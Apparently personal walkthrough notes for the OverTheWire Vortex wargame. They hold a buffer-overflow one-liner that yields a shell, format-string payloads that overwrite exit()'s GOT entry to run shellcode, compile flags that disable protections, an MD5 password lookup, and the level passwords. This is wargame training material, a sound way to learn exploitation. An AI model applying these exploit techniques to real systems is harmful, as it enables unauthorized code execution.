# ssh vortexn@vortex.labs.overthewire.org

Level0:
------------------------------------------------
L0.py 
Username: vortex1 Password: Gq#qu3bF3

Level 1:
------------------------------------------------
- '\\' moves back the pointer

python -c 'print "\\"*257 + "\xca" + "A"' | ./vortex1
sh-4.1# exit

Method 1)
How bash handles EOF..
http://byteninja.blogspot.ro/2011/09/overthewireorg-vortex-level1.html

- create a file with the following contents:
vi /tmp/cmd2
cat /etc/vortex_pass/vortex2

vortex1@melissa:/vortex$ python -c 'print "\\"*257 + "\xca" + "A"' | env ENV=/tmp/cmd2 /vortex/vortex1
23anbT\rE

Method 2)
http://www.pixelbeat.org/programming/stdio_buffering/
python -c 'print  "\\"*0x101+"\xcaA\n"+"A"*4000+"\nwhoami\ncat /etc/vortex_pass/vortex2"' |/vortex/vortex1

Username: vortex2 Password: 23anbT\rE

Level 2:
------------------------------------------------
vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3
/bin/tar: U\211\345WVS\350Z: Cannot stat: No such file or directory
/bin/tar: Exiting with failure status due to previous errors

vortex2@melissa:/etc/vortex_pass$ ls -alh '/tmp/ownership.$$.tar'
-rw-r--r-- 1 vortex3 vortex2 10K 2012-09-06 23:19 /tmp/ownership.$$.tar

Method 1) 
Untar and output to STDOUT :
tar xf '/tmp/ownership.$$.tar' -O
64ncXTvx#

Method 2)
Test with scp in verbose mode. $$ is interpreted so it should be correctly escaped. 
scp -v vortex2@vortex.labs.overthewire.org:'test$$' .
...

Copy archive locally:
scp vortex2@vortex.labs.overthewire.org:'/tmp/ownership.\$\$.tar' .

Method 3)
Tar command does not use compression, so the content of the archive can be viewed

vortex2@melissa:/etc/vortex_pass$ cat '/tmp/ownership.$$.tar'

Username: vortex3 Password: 64ncXTvx#

Level 3:
------------------------------------------------
https://github.com/antoinet/vortex/tree/master/vortex03


Test locally:
# echo 0 > /proc/sys/kernel/randomize_va_space
# gcc -fno-stack-protector -U_FORTIFY_SOURCE vortex3.c -o vortex3
# gcc file.c -D_FORTIFY_SOURCE=0 -fno-pie -Wno-format -Wno-format-security -fno-stack-protector -z norelro -z execstack -o out



# objdump -s -j .dtors a.out 

a.out:     file format elf32-i386

Contents of section .dtors:
 8049f14 ffffffff 00000000                    ........    
 
$ gdb vortex3
(gdb) disassemble __do_global_dtors_aux 
...
0x080483e5 <+21>:	mov    $0x8049f18,%ebx
...
(gdb) x/x 0x080483e6
0x80483e6 <__do_global_dtors_aux+22>:	0x08049f18
(gdb) x/x 0x08049f18
0x8049f18 <__DTOR_END__>:	0x00000000

Username: vortex4 Password: 2YmgK1=jw

Level 4:
------------------------------------------------
https://github.com/antoinet/vortex/blob/master/vortex04/
http://axtaxt.wordpress.com/2010/11/24/overthewire-vortex-level4/
http://www.overthewire.org/wargames/vortex/readingmaterial/teso_format.txt

- bypass first check
- get addr of environment variables
- use format string exploit to set a jump-to address on the stack
-- get address of exit() in .plt (readelf -r vortex4)
-- read this address with format strings
-- read environment variables
-- write there the address of the shellcode passed in environment variable

vortex4@melissa:/tmp$ readelf -r /vortex/vortex4 
Relocation section '.rel.plt' at offset 0x294 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000407 R_386_JUMP_SLOT   00000000   exit

vortex4@melissa:/tmp$ ./v4_wrapper `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$x%5\$0206d%109\$x%5\$032d%110\$x%111\$x

���A804a00c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000804a00d00000000000000000000000000000000804a00e804a00fvortex4@melissa:/tmp$ 

vortex4@melissa:/tmp$ ./myl4 `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$n%5\$0206d%109\$n%5\$032d%110\$n%111\$n
$ 

vortex4@melissa:/tmp$ ./myl4 `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$x%5\$0206d%109\$x%5\$032d%110\$x%111\$x

���A804a00c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000804a00d00000000000000000000000000000000804a00e804a00fvortex4@melissa:/tmp$

After brute force:
202 33 fmt: 
���....%106$n%5$0202d%107$n%5$033d%108$n%109$n: 
$ id
uid=5004(vortex4) gid=5004(vortex4) euid=5005(vortex5) groups=5005(vortex5),5004(vortex4)
$ cat /etc/vortex_pass/vortex5
:4VtbC4lr
$

203 32 fmt: 
���....%106$n%5$0203d%107$n%5$032d%108$n%109$n:
$

Username: vortex5 Password: :4VtbC4lr

Level 5:
------------------------------------------------
MD5 hash: 155fb95d04287b757c996d77b5ea51f7
Plain: rlTf6

http://www.md5this.com/

vortex5@melissa:/vortex$ ./vortex5 
Password: 
6:36
You got the right password, congrats!
$ cat /etc/vortex_pass/vortex6
*uy5qDRb2
$

Username: vortex6 Password: *uy5qDRb2

Level 6:
------------------------------------------------

Username: vortex7 Password: 
